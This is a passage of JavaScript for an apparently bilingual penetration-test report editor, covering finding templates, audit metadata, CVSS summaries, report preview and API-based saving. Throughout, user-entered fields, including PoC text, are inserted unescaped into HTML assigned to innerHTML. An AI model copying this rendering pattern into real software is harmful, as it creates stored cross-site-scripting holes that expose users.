        </header>
    `;
}

function renderEditor() {
    if (state.activeTab !== 'editor' || state.showSplash || state.showReportSelector) return '';
    if (state.showReportSelector) return '';

    const t = UI[state.lang];

    return `
        <div class="editor-container">
            <div class="editor-left">
                <div class="card">
                    <h2>${t.newFinding}</h2>
                    <p class="text-muted">${t.newFindingDesc}</p>
                    
                    <form id="findingForm" onsubmit="handleFindingSubmit(event)">
                        <div class="form-group">
                            <label>${t.quickTemplate}</label>
                            <select onchange="applyTemplate(this.value)">
                                <option value="custom">${t.customOther}</option>
                                <option value="sqli">SQL Injection</option>
                                <option value="xss">XSS</option>
                                <option value="idor">IDOR</option>
                                <option value="ssrf">SSRF</option>
                                <option value="csrf">CSRF</option>
                                <option value="xxe">XXE</option>
                                <option value="rce">RCE</option>
                                <option value="lfi">LFI</option>
                                <option value="cors">CORS Misconfig</option>
                                <option value="path_traversal">Path Traversal</option>
                                <option value="command_injection">Command Injection</option>
                                <option value="insecure_deserialization">Insecure Deserialization</option>
                                <option value="jwt_bypass">JWT Bypass</option>
                                <option value="file_upload">File Upload</option>
                                <option value="security_misconfig">Security Misconfig</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.vulnTitle}</label>
                            <input type="text" id="findingTitle" value="${state.currentFinding.title}" required oninput="updateCurrentFinding('title', this.value)">
                        </div>
                        
                        <div class="form-group">
                            <label>${t.severity}</label>
                            <select id="findingSeverity" onchange="updateCurrentFinding('severity', this.value)">
                                ${Object.entries(t.severityLevels).map(([key, label]) =>
        `<option value="${key}" ${state.currentFinding.severity === key ? 'selected' : ''}>${label}</option>`
    ).join('')}
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.description}</label>
                            <textarea id="findingDescription" rows="4" oninput="updateCurrentFinding('description', this.value)">${state.currentFinding.description}</textarea>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.cvss}</label>
                            <input type="text" id="findingCvss" value="${state.currentFinding.cvss}" oninput="updateCurrentFinding('cvss', this.value)">
                        </div>
                        
                        <div class="form-group">
                            <label>${t.poc}</label>
                            <textarea id="findingPoc" rows="4" oninput="updateCurrentFinding('poc', this.value)">${state.currentFinding.poc}</textarea>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.impact}</label>
                            <textarea id="findingImpact" rows="3" oninput="updateCurrentFinding('impact', this.value)">${state.currentFinding.impact}</textarea>
                        </div>

                        <div class="form-group image-upload-section" onpaste="handleImagePaste(event)">
                            <label>${t.images} <small style="font-weight:normal;color:#666;">(también puedes pegar imagen con Ctrl+V aquí)</small></label>
                            <input type="file" id="findingImages" accept="image/*" multiple onchange="handleImageUpload(event)">
                            <small class="text-muted">${state.currentFinding.images.length} imagen(es) seleccionada(s)</small>
                        </div>

                        ${state.currentFinding.images.length > 0 ? `
                        <div class="image-preview-container">
                            ${state.currentFinding.images.map((img, idx) => `
                                <div class="image-preview-item">
                                    <img src="${img}" alt="Evidencia ${idx + 1}">
                                    <button type="button" class="image-remove-btn" onclick="removeImage(${idx})">×</button>
                                </div>
                            `).join('')}
                        </div>
                        ` : ''}

                        <div class="form-group">
                            <label>${t.remediation}</label>
                            <textarea id="findingRemediation" rows="3" oninput="updateCurrentFinding('remediation', this.value)">${state.currentFinding.remediation}</textarea>
                        </div>

                        <div class="form-group">
                            <label>${t.reference}</label>
                            <input type="text" id="findingReference" value="${state.currentFinding.reference}" oninput="updateCurrentFinding('reference', this.value)">
                        </div>

                        <div class="form-group">
                            <label>${t.cve}</label>
                            <input type="text" id="findingCve" value="${state.currentFinding.cve}" oninput="updateCurrentFinding('cve', this.value)">
                        </div>
                        
                        <div class="form-actions">
                            <button type="submit" class="btn-primary">${t.addFinding}</button>
                            <button type="button" onclick="resetFindingForm()">${t.cancel}</button>
                        </div>
                    </form>
                </div>
            </div>
            
            <div class="editor-right">
                ${renderAuditData()}
                ${renderFindingsList()}
            </div>
        </div>
    `;
}

function renderAuditData() {
    const t = UI[state.lang];
    const d = state.auditData;

    return `
        <div class="card">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
                <h3 style="margin: 0;">Datos de la Auditoría</h3>
                <button class="btn-primary" onclick="saveCurrentReport()" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;" title="${t.saveReport}">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
                        <polyline points="17 21 17 13 7 13 7 21"></polyline>
                        <polyline points="7 3 7 8 15 8"></polyline>
                    </svg>
                    <span>${t.saveReport}</span>
                </button>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>${t.documentTitle}</label>
                    <input type="text" value="${d.documentTitle}" onchange="updateAuditData('documentTitle', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.clientCompany}</label>
                    <input type="text" value="${d.clientCompany}" onchange="updateAuditData('clientCompany', this.value)">
                </div>
            </div>
            
            <div class="form-group">
                <label>${t.clientLogo || 'Logotipo'}</label>
                <input type="file" accept="image/*" onchange="handleClientLogoUpload(event)">
                ${d.clientLogo ? `
                    <div style="margin-top: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                        <img src="${d.clientLogo}" alt="Logo" style="height: 40px; border-radius: 4px; border: 1px solid #e5e7eb;">
                        <button type="button" class="btn-sm btn-secondary" onclick="removeClientLogo()">×</button>
                    </div>
                ` : ''}
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label>${t.targetAsset}</label>
                    <input type="text" value="${d.targetAsset}" onchange="updateAuditData('targetAsset', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.auditorCompany}</label>
                    <input type="text" value="${d.auditorCompany}" onchange="updateAuditData('auditorCompany', this.value)">
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>${t.auditorName}</label>
                    <input type="text" value="${d.auditorName}" onchange="updateAuditData('auditorName', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.classification}</label>
                    <select onchange="updateAuditData('classification', this.value)">
                        ${Object.entries(t.classifications).map(([key, label]) =>
        `<option value="${key}" ${d.classification === key ? 'selected' : ''}>${label}</option>`
    ).join('')}
                    </select>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>${t.version}</label>
                    <input type="text" value="${d.version}" onchange="updateAuditData('version', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.date}</label>
                    <input type="date" value="${d.date}" onchange="updateAuditData('date', this.value)">
                </div>
            </div>
        </div>
    `;
}

function renderFindingsList() {
    const t = UI[state.lang];

    if (state.findings.length === 0) {
        return `<div class="card"><p class="text-muted">No hay hallazgos registrados</p></div>`;
    }

    return `
        <div class="findings-list">
            ${state.findings.map((f, idx) => `
                <div class="finding-item severity-${f.severity}">
                    <div class="finding-header">
                        <span class="finding-number">#${idx + 1}</span>
                        <span class="finding-title">${f.title}</span>
                        <span class="finding-severity">${t.severityLevels[f.severity]}</span>
                        <button onclick="deleteFinding(${idx})">×</button>
                    </div>
                </div>
            `).join('')}
        </div>
    `;
}

function renderCvssSummary() {
    const total = state.findings.length;
    if (total === 0) return '';

    const t = UI[state.lang];
    const counts = {
        crit: state.findings.filter(f => f.severity === 'crit').length,
        high: state.findings.filter(f => f.severity === 'high').length,
        med: state.findings.filter(f => f.severity === 'med').length,
        low: state.findings.filter(f => f.severity === 'low').length,
        info: state.findings.filter(f => f.severity === 'info').length
    };

    const colors = {
        crit: 'var(--severity-crit, #dc2626)',
        high: 'var(--severity-high, #f97316)',
        med: 'var(--severity-med, #eab308)',
        low: 'var(--severity-low, #22c55e)',
        info: 'var(--severity-info, #6b7280)'
    };

    const order = ['crit', 'high', 'med', 'low', 'info'];
    let barSegments = '';
    let legendItems = '';

    for (const sev of order) {
        if (counts[sev] > 0) {
            const pct = (counts[sev] / total) * 100;
            barSegments += `<div style="width: ${pct}%; background-color: ${colors[sev]}; height: 100%; transition: width 0.3s;" title="${t.severityLevels[sev]}: ${counts[sev]}"></div>`;
        }

        legendItems += `
            <div style="display: flex; align-items: center; gap: 0.5rem; background: #f9fafb; padding: 0.5rem 1rem; border-radius: 0.5rem; border: 1px solid #e5e7eb;">
                <div style="width: 12px; height: 12px; border-radius: 50%; background-color: ${colors[sev]};"></div>
                <span style="font-weight: 500; color: #374151;">${t.severityLevels[sev]}</span>
                <span style="font-weight: 800; color: #111827; margin-left: 0.25rem;">${counts[sev]}</span>
            </div>
        `;
    }

    const title = state.lang === 'es' ? 'Resumen de Vulnerabilidades (CVSS)' : 'Vulnerabilities Summary (CVSS)';

    return `
        <div class="cvss-summary card" style="margin: 2rem 0; padding: 1.5rem; page-break-inside: avoid;">
            <h3 style="margin-bottom: 1.5rem; border-bottom: 1px solid #f3f4f6; padding-bottom: 0.75rem; color: #111827;">${title}</h3>
            
            <div style="display: flex; height: 28px; width: 100%; border-radius: 6px; overflow: hidden; margin-bottom: 1.5rem; box-shadow: inset 0 2px 4px 0 rgba(0,0,0,0.06);">
                ${barSegments}
            </div>
            
            <div style="display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center;">
                ${legendItems}
            </div>
        </div>
    `;
}

function renderPreview() {
    if (state.activeTab !== 'preview' || state.showSplash || state.showReportSelector) return '';
    if (state.showReportSelector) return ''

    const t = UI[state.lang];
    const d = state.auditData;

    return `
        <div class="preview-container">
            <div class="report-header" style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 2rem;">
                <div>
                    <h1 style="margin-bottom: 1rem; color: #111827;">${d.documentTitle}</h1>
                    <div class="report-meta">
                        <p><strong>${t.clientCompany}:</strong> ${d.clientCompany}</p>
                        <p><strong>${t.targetAsset}:</strong> ${d.targetAsset}</p>
                        <p><strong>${t.auditorCompany}:</strong> ${d.auditorCompany}</p>
                        <p><strong>${t.auditorName}:</strong> ${d.auditorName}</p>
                        <p><strong>${t.date}:</strong> ${d.date}</p>
                    </div>
                </div>
                ${d.clientLogo ? `
                    <div class="client-logo-container" style="max-width: 200px; max-height: 120px;">
                        <img src="${d.clientLogo}" alt="Logo Cliente" style="max-width: 100%; max-height: 120px; object-fit: contain; border-radius: 8px;">
                    </div>
                ` : ''}
            </div>
            
            ${renderCvssSummary()}
            
            <div class="findings-preview">
                ${state.findings.map((f, idx) => `
                    <div class="finding-preview severity-${f.severity}">
                        <h3>#${idx + 1} - ${f.title}</h3>
                        <p><strong>Severidad:</strong> ${t.severityLevels[f.severity]}</p>
                        <p><strong>CVSS:</strong> ${f.cvss}</p>
                        ${f.description ? `<p><strong>Descripción:</strong> ${f.description}</p>` : ''}
                        ${f.poc ? `<p><strong>PoC:</strong> ${f.poc}</p>` : ''}
                        ${f.impact ? `<p><strong>Impacto:</strong> ${f.impact}</p>` : ''}
                        ${f.images && f.images.length > 0 ? `
                            <div class="finding-images">
                                <p><strong>Evidencias:</strong></p>
                                <div class="finding-images-grid">
                                    ${f.images.map((img, imgIdx) => `
                                        <img src="${img}" alt="Evidencia ${imgIdx + 1}" class="finding-evidence-img">
                                    `).join('')}
                                </div>
                            </div>
                        ` : ''}
                        ${f.remediation ? `<p><strong>Remediación:</strong> ${f.remediation}</p>` : ''}
                    </div>
                `).join('')}
            </div>
            
            ${renderCvssSummary()}
        </div>
    `;
}

function renderReportsPage() {
    if (!state.showReportSelector || state.showSplash) return '';

    const t = UI[state.lang];

    return `
        <div class="reports-page">
            <div class="reports-header">
                <h1>${t.myReports}</h1>
            </div>

            <div class="reports-list">
                ${state.savedReports.length === 0 ? `
                    <div class="empty-state">
                        <p>${t.noReports}</p>
                        <p class="text-muted">${t.noReportsDesc}</p>
                    </div>
                ` : state.savedReports.map(r => `
                    <div class="report-card" onclick="loadReport(${r.id})">
                        <h3>${r.document_title}</h3>
                        <p>${r.client_company}</p>
                        <span>${r.findings_count || 0} hallazgos</span>
                        <button onclick="event.stopPropagation(); deleteReport(${r.id})">Eliminar</button>
                    </div>
                `).join('')}
            </div>
        </div>
    `;
}

function renderApp() {
    const app = $('#app');

    app.innerHTML = `
        ${renderSplashScreen()}
        ${renderNavbar()}
        <main class="main-content">
            ${renderReportsPage()}
            ${renderEditor()}
            ${renderPreview()}
        </main>
    `;
}

// ==========================================
// ACCIONES
// ==========================================

function enterApp() {
    state.showSplash = false;
    renderApp();
}

function setLang(lang) {
    state.lang = lang;
    state.auditData.lang = lang;
    renderApp();
}

function setTab(tab) {
    state.activeTab = tab;
    renderApp();
}

async function showReports() {
    await loadSavedReports();
    state.showReportSelector = true;
    renderApp();
}

function hideReports() {
    state.showReportSelector = false;
    renderApp();
}

function updateAuditData(field, value) {
    state.auditData[field] = value;
    state.isDirty = true;
}

function updateCurrentFinding(field, value) {
    state.currentFinding[field] = value;
}

function applyTemplate(key) {
    if (key === 'custom') return;

    const template = templates[key];
    if (!template) return;

    const t = template[state.lang] || template.es;
    state.currentFinding = {
        ...state.currentFinding,
        templateKey: key,
        title: t.title,
        description: t.description,
        poc: t.poc || '',
        impact: t.impact,
        remediation: t.remediation,
        cvss: t.cvss,
        reference: t.reference
    };

    renderApp();
}

function handleFindingSubmit(e) {
    e.preventDefault();

    const finding = {
        id: Date.now(),
        templateKey: state.currentFinding.templateKey,
        title: $('#findingTitle').value,
        severity: $('#findingSeverity').value,
        description: $('#findingDescription').value,
        cvss: $('#findingCvss').value,
        poc: $('#findingPoc').value,
        impact: $('#findingImpact').value,
        remediation: $('#findingRemediation').value,
        reference: $('#findingReference').value,
        cve: $('#findingCve').value,
        images: state.currentFinding.images
    };

    state.findings.push(finding);
    state.isDirty = true;
    
    if (state.currentReportId) {
        localStorage.removeItem('report_' + state.currentReportId + '_draft');
    }
    
    resetFindingForm();
    renderApp();
}

function resetFindingForm() {
    state.currentFinding = {
        templateKey: 'custom',
        title: '',
        severity: 'med',
        description: '',
        cvss: '',
        poc: '',
        impact: '',
        remediation: '',
        reference: '',
        cve: '',
        images: []
    };
}

function deleteFinding(index) {
    state.findings.splice(index, 1);
    state.isDirty = true;
    renderApp();
}

function handleImageUpload(event) {
    const files = event.target.files;
    if (!files || files.length === 0) return;

    Array.from(files).forEach(file => {
        if (!file.type.startsWith('image/')) return;

        const reader = new FileReader();
        reader.onload = (e) => {
            state.currentFinding.images.push(e.target.result);
            renderApp();
        };
        reader.readAsDataURL(file);
    });

    // Limpiar el input para permitir seleccionar el mismo archivo nuevamente
    event.target.value = '';
}

function removeImage(index) {
    state.currentFinding.images.splice(index, 1);
    renderApp();
}

function handleImagePaste(event) {
    event.preventDefault();
    const items = event.clipboardData?.items;
    if (!items) return;

    let hasImages = false;

    Array.from(items).forEach(item => {
        if (item.type.startsWith('image/')) {
            hasImages = true;
            const blob = item.getAsFile();
            if (blob) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    state.currentFinding.images.push(e.target.result);
                    renderApp();
                };
                reader.readAsDataURL(blob);
            }
        }
    });

    if (hasImages) {
        event.stopPropagation();
    }
}

function handleClientLogoUpload(event) {
    const file = event.target.files[0];
    if (!file || !file.type.startsWith('image/')) return;
    const reader = new FileReader();
    reader.onload = (e) => {
        updateAuditData('clientLogo', e.target.result);
        renderApp();
    };
    reader.readAsDataURL(file);
}

function removeClientLogo() {
    updateAuditData('clientLogo', '');
    renderApp();
}

async function loadSavedReports() {
    try {
        state.savedReports = await API.reports.getAll();
    } catch (err) {
        console.error('Error loading reports:', err);
    }
}

async function createNewReport() {
    try {
        const report = await API.reports.create({
            document_title: 'Nuevo Reporte',
            client_company: 'Empresa',
            client_logo: '',
            target_asset: 'Sistema',
            auditor_company: 'Auditor',
            auditor_name: 'Auditor',
            classification: 2,
            version: '1.0',
            date: new Date().toISOString().split('T')[0],
            lang: state.lang
        });

        state.currentReportId = report.id;
        state.findings = [];
        state.isDirty = false;
        hideReports();
    } catch (err) {
        alert('Error creating report: ' + err.message);
    }
}

async function loadReport(id) {
    try {
        const report = await API.reports.getById(id);
        state.currentReportId = report.id;
        state.auditData = {
            documentTitle: report.document_title,
            clientCompany: report.client_company,
            clientLogo: report.client_logo || '',
            targetAsset: report.target_asset,
            auditorCompany: report.auditor_company,
            auditorName: report.auditor_name,
            classification: report.classification.toString(),
            version: report.version,
            date: report.date,
            lang: report.lang
        };
        state.lang = report.lang;
        state.findings = report.findings || [];
        
        const draft = localStorage.getItem('report_' + report.id + '_draft');
        if (draft) {
            try {
                state.currentFinding = JSON.parse(draft);
            } catch(e) {
                resetFindingForm();
            }
        } else {
            resetFindingForm();
        }
        
        state.isDirty = false;
        hideReports();
    } catch (err) {
        alert('Error loading report: ' + err.message);
    }
}

async function deleteReport(id) {
    if (!confirm('¿Eliminar este reporte?')) return;

    try {
        await API.reports.delete(id);
        if (state.currentReportId === id) {
            state.currentReportId = null;
        }
        loadSavedReports();
        renderApp();
    } catch (err) {
        alert('Error deleting report: ' + err.message);
    }
}

async function saveCurrentReport() {
    try {
        if (!state.currentReportId) {
            const report = await API.reports.create({
                document_title: state.auditData.documentTitle,
                client_company: state.auditData.clientCompany,
                client_logo: state.auditData.clientLogo || '',
                target_asset: state.auditData.targetAsset,
                auditor_company: state.auditData.auditorCompany,
                auditor_name: state.auditData.auditorName,
                classification: parseInt(state.auditData.classification) || 2,
                version: state.auditData.version,
                date: state.auditData.date,
                lang: state.auditData.lang || state.lang
            });
            state.currentReportId = report.id;
        } else {
            await API.reports.update(state.currentReportId, {
                document_title: state.auditData.documentTitle,
                client_company: state.auditData.clientCompany,
                client_logo: state.auditData.clientLogo || '',
                target_asset: state.auditData.targetAsset,
                auditor_company: state.auditData.auditorCompany,
                auditor_name: state.auditData.auditorName,
                classification: parseInt(state.auditData.classification) || 2,
                version: state.auditData.version,
                date: state.auditData.date,
                lang: state.auditData.lang || state.lang
            });
        }

        // Sync findings
        // Get existing to find which to delete
        const remoteReport = await API.reports.getById(state.currentReportId);
        const existingFindings = remoteReport.findings || [];
        const existingIds = existingFindings.map(f => f.id);
        const currentIds = state.findings.filter(f => f.id && typeof f.id !== 'string' && f.id < 1000000000000).map(f => f.id);

        // Remove deleted findings
        for (const id of existingIds) {
            if (!currentIds.includes(id)) {
                await API.findings.delete(id);
            }
        }

        // Upsert findings
        for (let i = 0; i < state.findings.length; i++) {
            const finding = state.findings[i];
            const payload = {
                template_key: finding.templateKey || finding.template_key || 'custom',
                title: finding.title,
                severity: finding.severity,
                description: finding.description || '',
                cvss: finding.cvss || '',
                poc: finding.poc || '',
                impact: finding.impact || '',
                remediation: finding.remediation || '',
                reference: finding.reference || '',
                cve: finding.cve || '',
                images: finding.images || [],
                order_index: i
            };

            if (!finding.id || finding.id > 1000000000000) {
                const created = await API.findings.create(state.currentReportId, payload);
                finding.id = created.id;
            } else {
                await API.findings.update(finding.id, payload);
            }
        }

        // Guardar estado del editor actual (borrador de hallazgo a medias)
        if (state.currentReportId) {
            localStorage.setItem('report_' + state.currentReportId + '_draft', JSON.stringify(state.currentFinding));
        }

        state.isDirty = false;
        renderApp();
        alert(state.lang === 'es' ? 'Reporte guardado correctamente' : 'Report saved successfully');
    } catch (err) {
        console.error(err);
        alert('Error: ' + err.message);
    }
}

// ==========================================
// INICIALIZACIÓN
// ==========================================

document.addEventListener('DOMContentLoaded', () => {
    renderApp();
});
